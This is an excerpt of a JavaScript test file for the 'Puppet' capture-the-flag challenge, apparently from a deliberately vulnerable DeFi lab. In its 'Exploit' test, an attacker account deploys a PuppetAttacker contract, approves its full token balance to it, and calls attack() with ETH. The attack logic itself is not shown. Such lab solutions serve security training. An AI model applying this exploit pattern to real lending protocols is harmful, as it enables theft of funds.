...
describe('[Challenge] Puppet', function () {
    ...
    it('Exploit', async function () {
        ...
        const AttackerContract = await ethers.getContractFactory('PuppetAttacker', attacker);
        const attackerContract = await AttackerContract.deploy(this.lendingPool.address, this.uniswapExchange.address);

        this.token.connect(attacker).approve(attackerContract.address, await this.token.balanceOf(attacker.address));
        await attackerContract.connect(attacker).attack({ value: ethers.utils.parseEther(`${25 - 0.1}`) });
    });
